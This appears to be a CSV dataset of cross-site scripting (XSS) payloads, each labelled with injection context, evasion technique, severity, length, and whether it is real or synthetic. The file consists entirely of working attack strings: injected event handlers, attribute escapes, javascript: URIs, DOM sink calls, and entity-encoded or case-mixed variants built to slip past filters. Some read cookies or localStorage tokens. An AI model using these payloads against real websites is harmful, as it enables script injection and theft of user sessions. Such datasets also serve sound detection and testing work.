payload,context,technique,severity,length,source
<foRm OngEstUreStaRt=ConSolE.lOg('XSS')>,tag_injection,synthetic,medium,40,synthetic
"`%3E%3Cimg src=x onkeypress=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,73,synthetic
%3Cset onend=alert(1)%3E,tag_injection,synthetic,medium,24,synthetic
"""><img src=x onmozfullscreenchange=alert(1)>",attribute_escape,synthetic,medium,44,synthetic
<xss ontoggl&#101;=consol&#101;.log('XSS')/>,tag_injection,synthetic,low,44,synthetic
"""%3E%3Cimg src=x onpagehide=prompt(document.domain)%3E",attribute_escape,synthetic,medium,54,synthetic
<frame onblur=alert(1) tabindex=1 id=x></frame><input autofocus>,tag_injection,none,medium,64,real
"<video oncontextmenu=""alert(1)"">AnonKryptiQuz</video>",tag_injection,none,medium,53,real
"s&#101;tTim&#101;out(""&#97;l&#101;rt(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))"",0)",dom_sink,synthetic,low,99,synthetic
<button popovertarget=x>Click me</button><thead ontoggle=alert(1) popover id=x>AnonKryptiQuz</thead>,tag_injection,none,medium,100,real
"<optgroup onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</optgroup>",tag_injection,none,medium,75,real
"<div draggable=""true"" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable style=display:block>drop here</sup>",tag_injection,none,medium,123,real
%27 onwheel=console.log(location.hash) %27,attribute_escape,synthetic,medium,42,synthetic
"<div ondblclick=""alert(1)"">AnonKryptiQuz</div>",tag_injection,none,medium,46,real
"<samp onmouseenter=""alert(1)"">AnonKryptiQuz</samp>",tag_injection,none,medium,50,real
"onfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt/**/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,96,synthetic
"<meta
ondrop=alert(document.domain)>",tag_injection,synthetic,medium,36,synthetic
	onfullscreenchange=console.log(1),event_handler,synthetic,medium,34,synthetic
onscrollsn&#97;pch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,71,synthetic
"""><img src=x ondblclick=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,66,synthetic
"""><img src=x onvolumechange=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
""" onb&#101;for&#101;p&#97;st&#101;=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,70,synthetic
"<hgroup onmousedown=""alert(1)"">AnonKryptiQuz</hgroup>",tag_injection,none,medium,53,real
' oNtoUchEnd=coNsoLe.Log(1) ',attribute_escape,synthetic,medium,29,synthetic
"<option draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</option>",tag_injection,none,medium,85,real
"""><img src=x onerror=\u0061lert(document.domain)>",attribute_escape,synthetic,low,49,synthetic
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable style=display:block>drop here</summary>",tag_injection,none,medium,135,real
"<style>@keyframes slidein {}</style><output style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></output>",tag_injection,none,medium,172,real
' %3E%3Csvg onbeforetoggle=alert(location.hash)%3E,attribute_escape,synthetic,medium,50,synthetic
"ongotpointercapture=\u0061lert&#40;String.fromCharCode(88,83,83)&#41;",event_handler,synthetic,high,69,synthetic
<rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>,tag_injection,none,medium,70,real
' onhashchange=confirm(document.domain) ',attribute_escape,synthetic,medium,41,synthetic
"""><Img srC=x onConTexTmeNu=AleRt(DocUmeNt.DomAin)>",attribute_escape,synthetic,medium,50,synthetic
"""><LisTinG oNtrAnsItiOnsTarT=cOnfIrm(doCumEnt.doMaiN)>",tag_injection,synthetic,medium,54,synthetic
<!--><xss onmouseover=console.log('XSS')>,tag_injection,synthetic,medium,41,synthetic
%3Cobject x=y onbeforepaste=confirm(document.domain)%3E,tag_injection,synthetic,medium,55,synthetic
<template onpointerup=alert(1) style=display:block>AnonKryptiQuz</template>,tag_injection,none,medium,75,real
	onmouseenter=alert(%27XSS%27),event_handler,synthetic,medium,30,synthetic
<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>,tag_injection,none,medium,74,real
<t&#101;mpl&#97;t&#101;	ondr&#97;g&#101;nt&#101;r=&#97;l&#101;rt('XSS')>,tag_injection,synthetic,low,72,synthetic
OnhAshChaNge=coNfiRm('XSS'),event_handler,synthetic,medium,27,synthetic
"""><img src=x oncanplay=console.log(location.hash)>",attribute_escape,synthetic,medium,50,synthetic
<blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>,tag_injection,none,medium,67,real
"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionstart=alert(1)></object>",tag_injection,none,medium,112,real
&quOt; onDraGenTer=coNsoLe.Log(1) x=&quOt;,attribute_escape,synthetic,medium,42,synthetic
"<div draggable=""true"" contenteditable>drag me</div><img2 ondragover=alert(1) contenteditable style=display:block>drop here</img2>",tag_injection,none,medium,129,real
<auDio	onInpUt=ProMpt(loCatIon.haSh)>,tag_injection,synthetic,medium,37,synthetic
"<s&#101;l&#101;ct
onvolum&#101;ch&#97;ng&#101;=consol&#101;.log(1)>",tag_injection,synthetic,low,67,synthetic
"<style>:target {color: red;}</style><colgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></colgroup>",tag_injection,none,medium,119,real
' ><svg onpromptaction=prompt(location.hash)>,attribute_escape,synthetic,medium,45,synthetic
""" %3E%3Csvg ongestureend=console.log('XSS')%3E",attribute_escape,synthetic,medium,46,synthetic
"<xmp
onmousewheel=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,56,synthetic
""" oNtoUchMovE=cOnsOle.loG(dOcuMenT.dOmaIn) """,attribute_escape,synthetic,medium,44,synthetic
%3Cbody onbeforecut=confirm(document.domain) onbeforecut=confirm(document.domain)%3E,tag_injection,synthetic,medium,84,synthetic
<s&#101;l&#101;ct	onpoint&#101;rmov&#101;=prompt('XSS')>,tag_injection,synthetic,medium,56,synthetic
%27><img src=x onwheel=console.log(location.hash)>,attribute_escape,synthetic,medium,50,synthetic
"<INPUT TYPE=""IMAGE"" SRC=""javascript:javascript:alert(1);"">",js_uri,case_variation,medium,58,real
"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(/AmoloHT/)//#"">XXX</a></body>",js_uri,none,medium,106,real
<form onsearch=console.log(1) onsearch=console.log(1)>,tag_injection,synthetic,medium,54,synthetic
`><img src=x onp&#97;g&#101;r&#101;v&#101;&#97;l=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,83,synthetic
"__proto__[""ontransitionend""]=alert(location.hash)",dom_sink,synthetic,medium,49,synthetic
__${prompt('XSS')}__::.x,template_injection,synthetic,medium,24,synthetic
onpagereveal=confirm(location.hash),event_handler,synthetic,medium,35,synthetic
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""prompt(docum&#101;nt.dom&#97;in)"")",dom_sink,synthetic,medium,91,synthetic
ontransitionstart=prompt(location.hash),event_handler,synthetic,medium,39,synthetic
'><img src=x onw&#101;bkit&#97;nim&#97;tion&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,95,synthetic
%22><meta onpointerover=confirm(1)>,tag_injection,synthetic,medium,35,synthetic
' onpromptaction=console.log('XSS') ',attribute_escape,synthetic,medium,37,synthetic
onblur=consol&#101;.log(1),event_handler,synthetic,low,26,synthetic
"<blink draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</blink>",tag_injection,none,medium,88,real
OnpRomPtdIsmIss=jaVasCriPt:ProMpt(1),event_handler,synthetic,medium,36,synthetic
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=fetch('XSS')%3E"")",dom_sink,synthetic,high,78,synthetic
<!--><ObjEct onAniMatIonCanCel=alErt(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,54,synthetic
"<u onmouseover=""alert(1)"">AnonKryptiQuz</u>",tag_injection,none,medium,43,real
"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",script_injection,none,low,93,real
"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",js_uri,none,medium,55,real
<boDy OniNvaLid=alErt(loCatIon.haSh)/>,tag_injection,synthetic,medium,38,synthetic
"<style>:target {color: red;}</style><tr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tr>",tag_injection,none,medium,107,real
<!--><listing ontransitionstart=confirm(document.domain)>,tag_injection,synthetic,medium,57,synthetic
<teMplAte/onConTexTmeNu=ConSolE.lOg(1)>,tag_injection,synthetic,medium,39,synthetic
%22 ><svg onblur=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,35,synthetic
&quot; onp&#97;g&#101;hid&#101;=confirm(1) x=&quot;,attribute_escape,synthetic,medium,51,synthetic
<m&#97;th x=y onpl&#97;ying=consol&#101;.log('XSS')>,tag_injection,synthetic,low,52,synthetic
<command onpointermove=alert(1) style=display:block>AnonKryptiQuz</command>,tag_injection,none,medium,75,real
""" onkeypress=\u0061lert('XSS') """,attribute_escape,synthetic,low,32,synthetic
 onfocusout=confirm('XSS'),event_handler,synthetic,medium,26,synthetic
"<meta HTTP-EQUIV=""Link"" Content=""<http://www.securitycompass.com/xss.css>; REL=stylesheet"">",tag_injection,none,low,91,real
"""><img src=x onpagehide=console.log(document.domain)>",attribute_escape,synthetic,medium,53,synthetic
<svg><script>/<@/>alert(1)</script>//INJECTX,script_injection,none,medium,44,real
<time onfocus=alert(1) autofocus tabindex=1>,tag_injection,none,medium,44,real
"<t&#101;mpl&#97;t&#101;/onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,92,synthetic
%22><img src=x onpointerrawupdate=alert(location.hash)>,attribute_escape,synthetic,medium,55,synthetic
"document.querySelector(""body"").innerHTML+=""XMLHttpRequest(String.fromCharCode(88,83,83))""",dom_sink,synthetic,high,89,synthetic
%22 ><svg onpagereveal=console.log(document.domain)>,attribute_escape,synthetic,medium,52,synthetic
""" onrepeat=alert(location.hash) """,attribute_escape,synthetic,medium,33,synthetic
"`><img src=x onreset=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,64,synthetic
"""'><img src=xxx:x \x0Conerror=javascript:alert(7465)>",js_uri,none,medium,53,real
"<input onbeforepaste=alert(1) value="""" autofocus>",tag_injection,none,medium,49,real
' onprompt&#97;ction=prompt(1) ',attribute_escape,synthetic,medium,32,synthetic
"""><img src=x ongotpoint&#101;rc&#97;ptur&#101;=consol&#101;.log('XSS')>",attribute_escape,synthetic,low,71,synthetic
'><img src=x oncut=consol&#101;.log(1)>,attribute_escape,synthetic,low,39,synthetic
<button popovertarget=x>Click me</button><tbody onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</tbody>,tag_injection,none,medium,106,real
<svgonload=alert(1)>,tag_injection,none,medium,21,real
"<ruby onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</ruby>",tag_injection,none,medium,66,real
javascript:void(alert(1)),js_uri,synthetic,medium,25,synthetic
"\' OndRagOveR=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,58,synthetic
' onwh&#101;&#101;l=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,low,61,synthetic
"java
script:alert(String.fromCharCode(88,83,83))",js_uri,synthetic,high,48,synthetic
"<body onUnload body onUnload=""javascript:javascript:alert(9420)""></body onUnload>",js_uri,none,medium,81,real
""" oNplAy=ProMpt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape,synthetic,high,48,synthetic
<&#97;r&#101;&#97; onclos&#101;=prompt(1)/>,tag_injection,synthetic,medium,43,synthetic
<script>/*/alert(location.hash)</script>,script_injection,synthetic,medium,40,synthetic
<baSe/OnkEydOwn=alErt('XSS')>,tag_injection,synthetic,medium,29,synthetic
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#101;v&#97;l(1)>"")",dom_sink,synthetic,low,69,synthetic
<marquee	onkeydown=confirm(1)>,tag_injection,synthetic,medium,30,synthetic
"	onmous&#101;wh&#101;&#101;l=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,75,synthetic
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=fEtcH(dOcuMenT.dOmaIn)>""",dom_sink,synthetic,high,68,synthetic
"<d&#101;t&#97;ils
onr&#101;p&#101;&#97;t=prompt(1)>",tag_injection,synthetic,medium,51,synthetic
<!--><plaintext onrepeat=prompt(%27XSS%27)>,tag_injection,synthetic,medium,43,synthetic
"""><link onw&#97;iting=confirm(1)>",tag_injection,synthetic,medium,33,synthetic
__${alert(1)}__::.x,template_injection,synthetic,medium,19,synthetic
"	onProMptActIon=coNfiRm(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,54,synthetic
"""%3E%3Cmtext onended=confirm(document.domain)%3E",tag_injection,synthetic,medium,48,synthetic
<!--><td onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,90,synthetic
'%3E%3Cimg src=x onreset=prompt(location.hash)%3E,attribute_escape,synthetic,medium,49,synthetic
"<samp onclick=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",tag_injection,none,medium,65,real
"element.setAttribute(%22onclick%22,%22alert(String.fromCharCode(88,83,83))%22)",dom_sink,synthetic,high,78,synthetic
<textarea onpointerover=alert(1) style=display:block>AnonKryptiQuz</textarea>,tag_injection,none,medium,77,real
 onr&#101;s&#101;t=prompt(1),event_handler,synthetic,medium,28,synthetic
%22 oncut=alert(%27XSS%27) %22,attribute_escape,synthetic,medium,30,synthetic
%27><img src=x onkeypress=alert(1)>,attribute_escape,synthetic,medium,35,synthetic
<tiTle srC=x onCliCk=ConFirM('XSS')>,tag_injection,synthetic,medium,36,synthetic
<button popovertarget=x>Click me</button><h1 onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</h1>,tag_injection,none,medium,100,real
"JavAscRipT:/*-/*`/*\`/*'/*""/**/(/* */oNCliCk=AleRt(LocAtiOn.HasH) )//%0D%0A%0d%0a",js_uri,synthetic,medium,81,synthetic
"""><Img srC=x onResEt=AleRt('XSS')>",attribute_escape,synthetic,medium,34,synthetic
`><img src=x onselect=confirm(location.hash)>,attribute_escape,synthetic,medium,45,synthetic
<im&#97;g&#101; onch&#97;ng&#101;=&#97;l&#101;rt(1)>,tag_injection,synthetic,low,52,synthetic
' ><svg onpopst&#97;t&#101;=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,62,synthetic
%3Caudio x=y onpause=console.log(document.domain)%3E,tag_injection,synthetic,medium,52,synthetic
"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable style=display:block>drop here</wbr>",tag_injection,none,medium,127,real
"""><base ontouchmove=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,63,synthetic
"<style>@keyframes slidein {}</style><audio2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></audio2>",tag_injection,none,medium,172,real
' onbeforeinput=console.log(document.domain) ',attribute_escape,synthetic,medium,46,synthetic
<SCRIPT>\u0061lert(location.hash)</SCRIPT>,script_injection,synthetic,low,42,synthetic
"setInterval(""alert(String.fromCharCode(88,83,83))"",100)",dom_sink,synthetic,high,55,synthetic
""" ><svg ongotpointercapture=prompt('XSS')>",attribute_escape,synthetic,medium,42,synthetic
"""><b&#97;s&#101; oninv&#97;lid=confirm(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,62,synthetic
onb&#101;for&#101;m&#97;tch=j&#97;v&#97;script:prompt('XSS'),event_handler,synthetic,medium,60,synthetic
"<animatemotion onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</animatemotion>",tag_injection,none,medium,87,real
"<listing onmousemove=""alert(1)"">AnonKryptiQuz</listing>",tag_injection,none,medium,55,real
onpointermove=javascr	ipt:confirm('XSS'),event_handler,synthetic,medium,40,synthetic
"<x title""=""&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"">",attribute_escape,none,medium,73,real
&quOt; onInpUt=ConFirM(1) x=&qUot;,attribute_escape,synthetic,medium,34,synthetic
OncHanGe=AleRt/***/(dOcuMenT.dOmaIn),event_handler,synthetic,low,36,synthetic
onpointermove=alert/***/(%27XSS%27),event_handler,synthetic,low,35,synthetic
<emBed x=Y oNweBkiTfuLlsCreEncHanGe=ConFirM(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,59,synthetic
`%3E%3Cimg src=x onscrollend=prompt(location.hash)%3E,attribute_escape,synthetic,medium,53,synthetic
javascript:%0aconsole.log('XSS'),js_uri,synthetic,medium,32,synthetic
\%27 ontouchend=prompt(%27XSS%27)//,attribute_escape,synthetic,medium,35,synthetic
`><Img srC=x onMouSewHeeL=aLerT(1)>,attribute_escape,synthetic,medium,35,synthetic
\%27 oncanplay=prompt(document.domain)//,attribute_escape,synthetic,medium,40,synthetic
&quot; ontouchmove=prompt(%27XSS%27) x=&quot;,attribute_escape,synthetic,medium,45,synthetic
' onsecuritypolicyviolation=console.log('XSS') ',attribute_escape,synthetic,medium,48,synthetic
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationstart=""alert(1)""></frameset>",tag_injection,none,medium,103,real
' ><svg onb&#101;for&#101;p&#97;st&#101;=consol&#101;.log('XSS')>,attribute_escape,synthetic,low,65,synthetic
"<listing onmouseover=""alert(1)"">AnonKryptiQuz</listing>",tag_injection,none,medium,55,real
' onerror=console.log(location.hash) ',attribute_escape,synthetic,medium,38,synthetic
"<style>:target {color:red;}</style><area id=x style=""transition:color 1s"" ontransitionend=alert(1)></area>",tag_injection,none,medium,106,real
"document.write(""<img src=x onerror=confirm(document.cookie+'&loc='+location.href)>"")",dom_sink,synthetic,high,84,synthetic
"""%3E%3Cset oncanplay=confirm(1)%3E",tag_injection,synthetic,medium,34,synthetic
<sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>,tag_injection,none,medium,64,real
<base onpageswap=alert(%27XSS%27)>,tag_injection,synthetic,medium,34,synthetic
"<option draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</option>",tag_injection,none,medium,65,real
OngEstUreStaRt=ConSolE.lOg&#40;loCatIon.haSh&#41;,event_handler,synthetic,low,49,synthetic
"<img src=""data:image/svg+xml,<svg onload='top[//.source+//ert//.source](document.cookie)'"">",dom_sink,none,high,91,real
<applet contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,60,real
%3Cform src=x onpagehide=confirm(1)%3E,tag_injection,synthetic,medium,38,synthetic
""" ><svG oNprOmpTdiSmiSs=ConFirM(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,63,synthetic
"<colgroup id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></colgroup>",tag_injection,none,medium,92,real
<dialog onstalled=confirm('XSS')/>,tag_injection,synthetic,medium,34,synthetic
